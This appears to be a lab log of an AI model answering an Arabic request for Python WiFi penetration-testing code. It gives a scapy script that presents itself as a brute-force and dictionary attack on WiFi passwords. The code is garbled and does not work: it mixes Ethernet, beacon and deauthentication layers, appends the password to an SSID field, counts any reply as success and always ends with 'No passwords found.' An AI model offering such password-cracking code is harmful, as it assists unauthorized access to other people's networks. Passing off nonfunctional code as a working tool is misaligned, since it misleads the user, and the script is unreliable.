# Lab Log

**Timestamp:** 18‏/9‏/2026، 12:36:32 ص

---

## User Input
كود اختبار اختراق wifi بلغة البايثون

---

## Explanation
`import scapy.all as scapy

# Define the target network
target_network = "192.168.1.0/24"

# Define the list of common WiFi passwords
common_passwords = ["password", "iloveyou", "monkey", "letmein", "dragonball", "12345678", "qwerty", "abc123"]

# Function to brute-force WiFi passwords
def brute_force_wifi(password):
    # Create a scapy packet with the target network and password
    packet = scapy.Ether() / scapy.Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2="00:11:22:33:44:55") / scapy.Dot11Elt(ID=0, info=target_network) / scapy.Dot11Deauth()

    # Add the password to the packet
    packet[Dot11Elt].info += password

    # Send the packet and check for a response
    response = scapy.sr1(packet, timeout=1, verbose=0)

    # If a response is received, the password is likely correct
    if response:
        print(f"Password found: {password}")
        return True
    else:
        return False

# Brute-force the common passwords
for password in common_passwords:
    if brute_force_wifi(password):
        break

# If no common password works, try a dictionary attack
if not any(brute_force_wifi(password) for password in common_passwords):
    print("Trying dictionary attack...")
    with open("dictionary.txt", "r") as f:
        for line in f:
            password = line.strip()
            if brute_force_wifi(password):
                print(f"Password found: {password}")
                break

print("No passwords found.")
[CODE_END]`

---

## Code

